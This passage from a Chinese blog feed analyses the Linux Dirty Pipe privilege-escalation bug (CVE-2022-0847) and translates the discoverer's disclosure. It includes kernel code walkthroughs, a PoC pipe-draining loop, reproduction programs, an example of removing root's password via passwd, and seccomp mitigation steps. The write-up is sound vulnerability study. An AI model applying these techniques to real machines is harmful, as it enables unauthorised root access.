class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br><span class="hljs-built_in">read</span>(p[<span class="hljs-number">0</span>], buffer, n);<br>r -= n;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li><li>为什么调用完<code>splice()</code>在调用<code>write()</code>操作，可以使得两次写入同一个pipe_buf中？指针怎么调整的？<ol><li><code>splice()</code>调用<code>copy_page_to_iter_pipe()</code> 时，将待写入的文件的 page 与 pipe_buffer 的 <code>page</code> 字段关联之后，然后将 <code>pipe_inode_info</code> 实例的 <code>head</code> 值增加了 1，指向新的pipe_buffer <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/lib/iov_iter.c#L367</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span> <span class="hljs-title">copy_page_to_iter_pipe</span><span class="hljs-params">(struct page *page, <span class="hljs-keyword">size_t</span> offset, <span class="hljs-keyword">size_t</span> bytes,struct iov_iter *i)</span></span>&#123;<br>…… ……<br>buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br><span class="hljs-built_in">get_page</span>(page);<br>buf-&gt;page = page;<br>buf-&gt;offset = offset;<br>buf-&gt;len = bytes;<br><br>pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<span class="hljs-comment">//此时本来指向下一个pipe_buffer的</span><br>i-&gt;iov_offset = offset + bytes;<br>i-&gt;head = i_head;<br>  …… ……<br>&#125;<br></code></pre></td></tr></table></figure></li><li><code>write()</code>操作调用 <code>pipe_write()</code> 之后，会进入 <code>if (chars &amp;&amp; !was_empty)</code> 分支。if 分支里获取 <code>pipe_buffer</code> 的时候将 <code>head</code> 值减 1，从而此时 <code>pipe_buffer</code> 的 page 指向的是文件的 page。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/fs/pipe.c#L403</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span>   <span class="hljs-title">pipe_write</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *from)</span></span>&#123;<br>…… ……<br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<span class="hljs-comment">//这里减去了1</span><br><span class="hljs-keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br><span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;offset + chars &lt;= PAGE_SIZE) &#123;<br>ret = <span class="hljs-built_in">pipe_buf_confirm</span>(pipe, buf);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">goto</span> out;<br>ret = <span class="hljs-built_in">copy_page_from_iter</span>(buf-&gt;page, offset, chars, from);<br>…… ……<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h2 id="漏洞的局限性"><a href="#漏洞的局限性" class="headerlink" title="漏洞的局限性"></a>漏洞的局限性</h2><p><strong>1．可供攻击的机器太少。</strong><br>由于存在漏洞的是5.8以上的内核，极少有公司生产环境更新的如此及时，而最新的内核已经修复了这个漏洞。因而，野外环境中很少有机器能够利用这个漏洞。如何您的内核版本正好包含该漏洞，更新到最新版本可以修复该漏洞。</p><p><strong>2．不能持久化。</strong><br>由于修改的是页面缓存，并未修改磁盘上的文件（有极小概率某个对文件有写权限的进程碰巧执行了读写操作，导致缓存被回写磁盘），虽然可以用于提权等操作，但是如果完成提权后不对被修改的文件重新进行持久化操作的话，当操作系统回收内存或者更简单的重启机器后，所做的修改都将失效。如：修改passwd文件去除掉root用户密码后，简单一个重启操作，root密码就恢复如初了。</p><p><strong>3．特殊文件限制。</strong><br>由于文件系统的特性，一些特殊文件不经过页面缓存，导致此漏洞对这类文件无效。</p><h2 id="漏洞的缓解措施"><a href="#漏洞的缓解措施" class="headerlink" title="漏洞的缓解措施"></a>漏洞的缓解措施</h2><p>如果无法升级或修补内核，您可以部署一个不允许系统调用的 seccomp 配置文件<code>splice</code>。虽然这可能会导致某些软件包出现问题，但阻止系统调用通常不会对合法应用程序产生影响，因为使用此系统调用的情况相对较少。</p><p>具体来说，为了保护 Docker 容器，可以修改 Docker 的<a href="https://github.com/moby/moby/blob/master/profiles/seccomp/default.json">默认 seccomp 配置文件</a>并从允许的系统调用列表中删除 splice：</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2018.png"></p><p>创建自定义 seccomp 配置文件后，可以通过运行以下命令将其应用于新的 Docker 容器：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run --security-opt seccomp=<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/seccomp/</span>profile.json …<br></code></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://jfrog.com/blog/dirtypipe-cve-2022-0847-the-new-dirtycow/">https://jfrog.com/blog/dirtypipe-cve-2022-0847-the-new-dirtycow/</a></p></blockquote><h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol><li>这个漏洞的发现经历也非常有趣, 作者居然是从软件bug分析一路走到了内核漏洞披露, 相当佩服作者这种求索精神, 可以想象一个人在代码堆中翻阅各种实现细节时的辛酸, 也感谢作者如此详细的披露与分享。同时更重要的是追根溯源的探索的乐趣，我想这就是我为什么喜欢安全的原因之一</li><li>感慨本科所学的《计算机组成原理》，虽然当时看起来有点枯燥无用，但此时对于page,page cache,pipe这一块的知识或多或少能理解点</li><li>P牛是真卷啊，当然大家也都是，我只能慢慢跟上大家的步伐。</li><li>微博上部分评论<blockquote><p><a href="https://weibo.com/u/1684840802">瘦肉丁</a>:认真的人应得的奖赏，经常说：“在你那儿崩溃了？在我这跑好好的啊”的人，可能永远无法有深度的收获。</p><p><a href="https://weibo.com/u/2093018862">星先生cxm</a>:“排除一切不可能的，剩下的即使再不可能，那也是真相”帅啊</p></blockquote></li><li>有趣的发现：Linux 4.1 ：<a href="https://github.com/torvalds/linux/commit/5a81e6a171cdbd1fa8bc1fdd80c23d3d71816fac">commit d3d71816fac vfs: fix uninitialized flags in splice_to_pipe()</a> ：之前也存在<code>buf-&gt;flags</code>未初始化的问题</li></ol><h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><ol><li>没有用GDB来调试，只能硬看，等后期学pwn二进制的时候再折返</li><li>跟着git的操作，查看一下作者的分析历程：<a href="http://blog.nsfocus.net/unix-11-git-2/">UNIX系列(11)–GIT源码查错技巧 -scz</a></li><li>容器逃逸<ol><li><strong><strong><a href="https://www.datadoghq.com/blog/engineering/dirty-pipe-container-escape-poc/">Using the Dirty Pipe Vulnerability to Break Out from Containers</a></strong></strong></li><li><a href="https://tttang.com/archive/1484/">Docker又爆出高危逃逸漏洞了？仔细研究下事情没那么简单</a></li><li><a href="https://mp.weixin.qq.com/s/VMR_kLz1tAbHrequa2OnUA">从DirtyPipe到Docker逃逸</a></li></ol></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>漏洞原理探究：</p><ol><li>漏洞发现者：<a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability -by Max Kellermann</a> </li><li>ghost461@知道创宇404实验室：<a href="https://paper.seebug.org/1843/">Linux 内核提权 DirtyPipe(CVE-2022-0847) 漏洞分析</a> ，从can_merge的引入分析漏洞成因。漏洞视角这部分参考之</li><li>未然实验室@华为安全：<a href="https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg">未然公告丨Dirty Pipe - linux内核提权漏洞分析</a> ，从管道（pipe）实现机制和pipe_write()函数分析漏洞成因（pipe.c，以及作图参考之）</li><li>bigric3_@SilverNeedleLab：<a href="https://mp.weixin.qq.com/s/BtWRasj4xsiN_kmjULFrTw">DirtyPIPE漏洞分析从0到1</a>  ，从<em>Arinerron的POC的执行步骤</em>分析漏洞成因</li><li>Nitro@360GearTeam ：<a href="https://www.anquanke.com/post/id/269886">Linux 内核 DirtyPipe 任意只读文件覆写漏洞（CVE-2022-0847）分析</a> 。函数调用分析很具体看是看不懂emm，但是漏洞复现和调试部分还是很精彩</li><li>ADLab@启明星辰:<a href="https://mp.weixin.qq.com/s/RoGHvNW2Y6dZOjgsBVVm5Q">Linux内核权限提升漏洞“DirtyPipe”（CVE-2022-0847）分析</a> ，pipe和splice系统调用实现分析比较清楚，感觉一般</li><li>little_fish：<a href="https://forum.huawei.com/enterprise/en/linux-dirty-pipe-vulnerability-cve-2022-0847/thread/836529-891">Linux Dirty Pipe Vulnerability (CVE-2022-0847)</a> ，将page cache和pipe时候通过画图挺好理解的</li></ol><p>漏洞复现：</p><ol><li>zjun:<a href="https://blog.zjun.info/2022/cve-2022-0847.html">CVE-2022-0847 Dirty Pipe Linux 内核提权漏洞</a></li><li>P牛知识星球：《代码审计》</li></ol><blockquote><p>文章来源：通过sogo搜微信公众号文章+hacking8搜+google搜，历史文章一个个点开找</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>漏洞研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>CVE-2022-0847</tag>
      
      <tag>Dirty Pipe提权漏洞</tag>
      
      <tag>技术探索</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>The Dirty Pipe Vulnerability[中文翻译]</title>
    <link href="/2022/03/15/The%20Dirty%20Pipe%20Vulnerability/"/>
    <url>/2022/03/15/The%20Dirty%20Pipe%20Vulnerability/</url>
    
    <content type="html"><![CDATA[<h1 id="The-Dirty-Pipe-Vulnerability"><a href="#The-Dirty-Pipe-Vulnerability" class="headerlink" title="The Dirty Pipe Vulnerability"></a>The Dirty Pipe Vulnerability</h1><p>原文：<a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability</a><br>作者：Max Kellermann <a href="mailto:&#109;&#97;&#x78;&#46;&#x6b;&#101;&#x6c;&#108;&#101;&#114;&#x6d;&#97;&#x6e;&#110;&#64;&#x69;&#111;&#110;&#111;&#x73;&#x2e;&#99;&#111;&#x6d;">&#109;&#97;&#x78;&#46;&#x6b;&#101;&#x6c;&#108;&#101;&#114;&#x6d;&#97;&#x6e;&#110;&#64;&#x69;&#111;&#110;&#111;&#x73;&#x2e;&#99;&#111;&#x6d;</a></p><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>这是CVE-2022-0847的故事，自5.8版本以来，Linux内核中存在一个漏洞，允许覆盖任意只读文件中的数据。这会导致权限升级，因为非特权进程可以将代码注入根进程。<br>它类似于CVE-2016-5195“脏牛”，但更容易利用。<br>Linux 5.16.11、5.15.25和5.10.102中修复了该漏洞。</p><h1 id="损坏I"><a href="#损坏I" class="headerlink" title="损坏I"></a>损坏I</h1><p>这一切都始于一年前，当时有一张关于文件损坏的工单。一位客户抱怨他们下载的访问日志无法解压缩。事实上，其中一台日志服务器上有一个损坏的日志文件；它可以被解压缩，但gzip报告了一个CRC错误。我无法解释它为什么会损坏，但我认为每晚的split进程发生了crash，造成了文件的损坏。我手动修复了文件的CRC，关闭了工单，很快就忘记了这个问题。<br>几个月后，这种情况一再发生。每次文件的内容看起来都是正确的，只有文件末尾的CRC是错误的。现在有了几个损坏的文件，我能够深入挖掘，发现了一种令人惊讶的损坏问题。一种pattern浮现了出来。</p><h1 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h1><p>让我简单介绍一下日志服务器的工作原理：在CM4all托管环境中，所有web服务器（运行我们的自定义开源HTTP服务器）都会发送UDP多播数据报，其中包含关于每个HTTP请求的元数据。这些都是运行Pond的日志服务器接收的，Pond是我们定制的开源内存数据库。夜间作业将前一天的所有访问日志拆分(split)为每个托管网站的一个日志，每个日志都用zlib压缩。<br>通过HTTP，一个月的所有访问日志都可以作为一个单独的<code>.gz</code>文件下载。使用一个技巧（涉及到<code>Z_SYNC_FLUSH</code>），我们可以连接所有gzip每日日志文件，而不必解压和重新压缩它们，这意味着这个HTTP请求几乎不消耗CPU。通过使用<code>splice()</code>系统调用将数据直接从硬盘送到HTTP连接中，而不通过内核/用户空间边界（“零拷贝”），进而可以节省内存带宽。<br>Windows用户无法处理<code>.gz</code>文件，但每个人都可以解压缩ZIP文件。一个ZIP文件只是一个<code>.gz</code>文件的容器，因此我们可以使用相同的方法实时生成ZIP文件；我们需要做的就是先发送一个ZIP头，然后和往常一样连接所有<code>.gz</code>文件的内容，后面是中心目录（另一种头）。</p><h1 id="损坏II"><a href="#损坏II" class="headerlink" title="损坏II"></a>损坏II</h1><p>以下是一份正式的日常文件的结尾：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">000005f</span>0  <span class="hljs-number">81</span> d6 <span class="hljs-number">94</span> <span class="hljs-number">39</span> <span class="hljs-number">8</span>a <span class="hljs-number">05</span> b0 ed  e9 c0 fd <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> ff ff<br><span class="hljs-number">00000600</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">9</span>c <span class="hljs-number">12</span> <span class="hljs-number">0b</span> f5 f7 <span class="hljs-number">4</span>a  <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p><code>00 00 ff ff</code>是允许简单连接的<a href="https://www.bolet.org/~pornin/deflate-flush-fr.html">sync flush</a>。<code>03 00</code>是一个<a href="https://datatracker.ietf.org/doc/html/rfc1951#page-9">空的“final”块</a>，后面跟一个CRC32（0xf50b129c）和未压缩文件长度（<code>0x00004af7</code>=19191字节）。<br>相同的文件，但已损坏的文件结尾：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">000005f</span>0  <span class="hljs-number">81</span> d6 <span class="hljs-number">94</span> <span class="hljs-number">39</span> <span class="hljs-number">8</span>a <span class="hljs-number">05</span> b0 ed  e9 c0 fd <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> ff ff<br><span class="hljs-number">00000600</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">50</span> <span class="hljs-number">4b</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">1</span>e <span class="hljs-number">03</span>  <span class="hljs-number">14</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>sync flush在，empty final block在，但未压缩的长度现在是<code>0x0014031e</code>=1.3 MB（这是错误的，因为文件是与上面相同的19kB文件）。CRC32为<code>0x02014b50</code>，这与文件内容不匹配。为什么？这是日志客户端中的out-of-bounds write还是heap corruption的BUG？<br>我比较了所有已知的损坏文件，惊讶地发现它们都有相同的CRC32和相同的“文件长度”值。总是相同的CRC——这意味着这不能是CRC计算的结果。对于损坏的数据，我们会看到不同（但错误）的CRC值。我一直盯着代码上的漏洞，盯了几个小时但找不到解释。<br>然后我盯着这8个字节。最终，我意识到<code>50 4b</code>是代表“P”和“K”的ASCII码。“PK”，这就是所有ZIP标题的开头。让我们再看看这8个字节：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">50</span> <span class="hljs-number">4b</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">1</span>e <span class="hljs-number">03</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><ul><li><code>50 4b</code> is “PK”</li><li><code>0x02014b50</code> 是<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#Central_directory_file_header">中心目录的特征头</a></li><li>“Version made by” = <code>1e 03</code>; <code>0x1e</code> = 30 (3.0); <code>0x03</code> = UNIX</li><li>“Version needed to extract” = <code>14 00</code>; <code>0x0014</code> = 20 (2.0)<br>其余的中心目录文件头都不见了；很明显头文件在8字节后被截断。<br>这实际上是ZIP中央目录文件头的开始，这不能是巧合。但编写这些文件的进程中没有生成此类头文件的代码。在绝望中，我查看了zlib源代码和该过程使用的所有其他库，但什么也没找到。这个软件对“PK”头一无所知。<br>不过，有一个进程会生成“PK”头；web服务会实时构造ZIP文件。但这个进程以另一个用户的身份运行，该用户对这些文件没有写权限。不可能是这个进程。<br>所有这些都没有意义，但新的工单不断出现（速度非常慢）。可能存在系统上的问题，但我就是没找到。这让我很沮丧，但我忙于其他任务，我一直把这个文件损坏问题推到任务队列的后面。</li></ul><h1 id="损坏III"><a href="#损坏III" class="headerlink" title="损坏III"></a>损坏III</h1><p>外部压力使我重新意识到了这个问题。我扫描了整个硬盘，寻找损坏的文件（花了两天时间），希望出现更多的规律。事实上，有一种规律：</p><ul><li>在过去3个月内，共有37个损坏文件发生在22个独特的日期</li><li>其中18天发生1次损坏</li><li>1天发生2次损坏（2021-11-21）</li><li>1天发生7次损坏（2021-11-30）</li><li>1天发生6次损坏（2021-12-31）</li><li>1天发生4次损坏（2022-01-31）<br>每个月的最后一天显然是发生文件损坏最多的一天。<br>只有主日志服务器有损坏（提供HTTP连接和构造ZIP文件的服务器）。备用服务器（HTTP非活动，但日志提取过程相同）没有损坏文件。两台服务器上的数据都是相同的，除了那些损坏的文件。<br>这是由脆弱的硬件造成的吗？损坏的RAM？糟糕的存储？宇宙射线？不，这些症状看起来不像是硬件问题。机器里有鬼？我们需要驱魔师吗？</li></ul><h1 id="盯着代码"><a href="#盯着代码" class="headerlink" title="盯着代码"></a>盯着代码</h1><p>我又开始盯着代码上的漏洞，这次是web服务。<br>请记住，web服务会写入一个ZIP头，然后使用<code>splice()</code>发送所有压缩文件，最后再次使用<code>write()</code>发送“中心目录文件头”，该文件头以<code>50 4b 01 02 1e 03 14 00</code>开头，这正是损坏的位置。通过数据流发送的数据看起来与磁盘上的损坏文件一模一样。但是通过网络发送的进程对这些文件没有写权限（甚至没有尝试这样做），它只读取它们。不管遇到什么困难和不可能的事情，<strong>一定</strong>是这个进程导致了文件损坏，但如何导致文件损坏呢？<br>我的第一个灵感闪现，为什么总是在一个月的最后一天损坏。当网站所有者下载访问日志时，服务器从每月的第一天开始，然后是第二天，依此类推。当然，一个月的最后一天是在月底发送的；一个月的最后一天总是跟在“PK”标题后面。这就是为什么它更有可能在最后一天损坏。（如果请求的月份尚未结束，其他日子也可能会发送文件损坏问题，但这种可能性较小。）<br>所以如何导致文件损坏的？</p><h1 id="盯着内核代码"><a href="#盯着内核代码" class="headerlink" title="盯着内核代码"></a>盯着内核代码</h1><p>在这里被困了几个小时之后，且消除了所有绝对不可能的事情之后（在我看来），我得出了一个结论：这一定是一个内核错误。<br>将数据损坏归咎于Linux内核（即其他人的代码）必须是最后的手段。这不太可能。内核是一个极其复杂的项目，由成千上万的人用看似混乱的方法开发；尽管如此，它还是非常稳定和可靠的。但这一次，我确信这一定是一个内核错误。<br>在一个非常清晰的时刻，我破解了两个C程序。<br>一个程序持续将字符串“AAAAA”的奇数块写入文件（模拟日志拆分器）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;AAAAA&quot;</span>, <span class="hljs-number">5</span>);<br>&#125;<br><span class="hljs-comment">// ./writer &gt;foo</span><br></code></pre></td></tr></table></figure><p>另一个使用<code>splice()</code>将数据从该文件传输到管道，然后将字符串“BBBBB”写入管道（模拟ZIP生成器）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-built_in">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;BBBBB&quot;</span>, <span class="hljs-number">5</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// ./splicer &lt;foo |cat &gt;/dev/null</span><br></code></pre></td></tr></table></figure><p>我把这两个程序复制到了日志服务器上，然后…<strong>Bingo</strong>！字符串“BBBBB”开始出现在文件中，尽管从未有人将此字符串写入文件（仅通过没有写入权限的进程写入管道）。<br>所以这真的是一个内核错误！<br>一旦BUG被复现，问题就会变得很清晰。通过快速检查，验证了该漏洞影响的是Linux 5.10（Debian Bullseye），而不是Linux 4.19（Debian Buster）。v4.19和v5.10之间有185.011个git commit，但多亏了<code>git bisect</code>，只需17个步骤就可以找到错误的commit 。<br>当<code>bisect</code>到达commit <a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">f6dd975583bd</a>，它为匿名管道缓冲区重构了管道缓冲区代码。它改变了管道““mergeable””检查的方式。</p><blockquote><p>之前是定义为函数的形式，然后现在定义了一个变量</p></blockquote><h1 id="管道、缓冲区和页面"><a href="#管道、缓冲区和页面" class="headerlink" title="管道、缓冲区和页面"></a>管道、缓冲区和页面</h1><p>为什么是管道？在我们的设置中，生成ZIP文件的web服务通过管道与web服务器通信；它使用了我们开源的<a href="https://github.com/CM4all/libwas/">Web应用程序套接字协议</a>，因为我们对CGI、FastCGI和AJP不满意。使用管道而不是通过套接字进行多路复用（如FastCGI和AJP所做的）有一个主要优势：可以在应用程序和web服务器中使用<code>splice()</code>，以获得最大效率。这减少了在进程外的web应用程序的开销（而不是像Apache模块那样在web服务器进程内运行web服务）。这允许在不牺牲（很多）性能的情况下分离权限。<br><a href="https://www.kernel.org/doc/html/latest/admin-guide/mm/concepts.html">Linux内存管理</a>的简短介绍：CPU管理的最小内存单元是一个<strong>Page</strong>（通常为4KB）。在Linux的内存管理层中，最底层的都是和Page相关。如果应用程序从内核请求内存，它将获得大量（匿名）Pages。所有文件I/O也都与Pages有关：如果从文件中读取数据，内核首先将大量4KB的数据块从硬盘复制到内核内存中，由一个名为<strong>Page cache</strong>(页面缓存)的子系统管理。从那里，数据将被复制到用户空间。Page cache中的副本会保留一段时间，以便再次使用，从而避免不必要的硬盘I/O，直到内核决定更好地使用该内存（回收）。使用<code>mmap()</code>系统调用将Page cache管理的Page直接映射到用户空间，而不需要将文件数据复制到用户空间内存去（以增加页面错误和TLB刷新为代价降低内存带宽的折衷方案）。Linux内核有更多的trick：<code>sendfile()</code>系统调用允许应用程序将文件内容发送到socket，而无需往返到用户空间（这是一种在通过HTTP提供静态文件的web服务器中比较流行的优化措施）。<code>splice()</code>系统调用是<code>sendfile()</code>的一种泛化：它允许进行相同的优化；传输的任一侧是管道，另一侧几乎可以是任何东西（另一个管道、一个文件、一个套接字、一个块设备、一个字符设备）。内核通过传递<strong>Page</strong> 引用(references)来实现这一点，而不是实际复制任何内容（零拷贝）。<br><strong>管道</strong>是单向进程间通信的工具。一端push数据，另一端pull数据。Linux内核通过一个<a href="https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L26-L32">struct pipe_buffer</a>的<a href="https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L76">ring</a>来实现这一点，每个pipe_buffer都指向一个<strong>Page</strong>。对管道的第一次写入会分配一个Page（可容纳4KB数据的空间）。如果最近一次写入没有完全填满页面，则后续写入可能会附加到该现有页面，而不是分配新页面。这就是“匿名”管道缓冲区的工作原理（<a href="https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L217-L221">anon_pipe_buf_ops</a>）。<br>但是，如果将<code>splice()</code>数据从文件拼接到管道中，内核将首先将数据加载到<strong>Page cache</strong>中。然后，它将创建一个指向page cache内部的<code>struct pipe_buffer</code> 的指针（零拷贝），但与匿名管道缓冲区不同，写入管道的附加数据不能附加到这样的Page上，因为Page由Page cache而不是管道拥有。<br>检查是否有可以将新数据附加到现有管道缓冲区的代码历史记录：</p><ul><li>很久之前， <code>struct pipe_buf_operations</code> 有一个flag为<code>can_merge</code>.</li><li><a href="https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d">Commit 5274f052e7b3 “Introduce sys_splice() system call” (Linux 2.6.16, 2006)</a> 。以<code>splice()系统</code>调用为特色，引入了<code>page_cache_pipe_buf_ops</code>，这是一个<code>struct pipe_buf_operations</code>实现，用于指向page cache的管道缓冲区，第一个是<code>can_merge=0</code>（不可合并）。</li><li><a href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4</a> 将can_merge的flag转换为和 <code>struct pipe_buf_operations</code>指针比较，因为只有一个<code>anon_pipe_buf_ops</code> 可以设置了此标志。</li><li><a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops” (Linux 5.8, 2020)</a>  将此指针比较的方式转换为每个缓冲区的flag<code>PIPE_BUF_FLAG_CAN_MERGE</code>.<br>这些年来，这个check被反复重构，哪一个是对的？或者他是什么？</li></ul><h1 id="未初始化"><a href="#未初始化" class="headerlink" title="未初始化"></a>未初始化</h1><p>在<code>PIPE_BUF_FLAG_CAN_MERGE</code>诞生的几年前，<a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit 241699cd72a8 “new iov_iter flavour: pipe-backed” (Linux 4.9, 2016)</a>添加了两个新函数，它们分配了一个新的<code>struct pipe_buffer</code>，但缺少对其flags成员的初始化。现在可以使用任意flags创建Page cache的引用，但这并不重要。从技术上讲，这是一个bug，尽管当时没有任何后果，因为所有现有的flag都无法使用。<br>在Linux5.8中，这个bug突然变得非常严重，因为它使用了<a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">commit f6dd975583bd“pipe:merge anon_pipe_buf*_ops”</a>。通过将<code>PIPE_BUF_FLAG_CAN_MERGE</code>注入Page cache引用，使得只需将新数据写入以特殊方式准备的管道，就可以覆盖Page cache中的数据。</p><h1 id="损坏IV"><a href="#损坏IV" class="headerlink" title="损坏IV"></a>损坏IV</h1><p>这就解释了文件损坏的原因：首先，一些数据被写入管道，然后大量文件被拼接，并且创建Page cache引用。这些引用随机的，可能有或可能没有设置<code>PIPE_BUF_FLAG_CAN_MERGE</code> 。如果有，那么写入中央目录文件头的<code>write()</code>调用将被写入到最后一个压缩文件的Page cache中。<br>但为什么只有头8个字节？实际上，所有的头都会被复制到页面缓存中，但这个操作不会增加文件大小。原始文件末尾只有8个字节的“未拼接”空间，只有这些字节可以被覆盖。从page 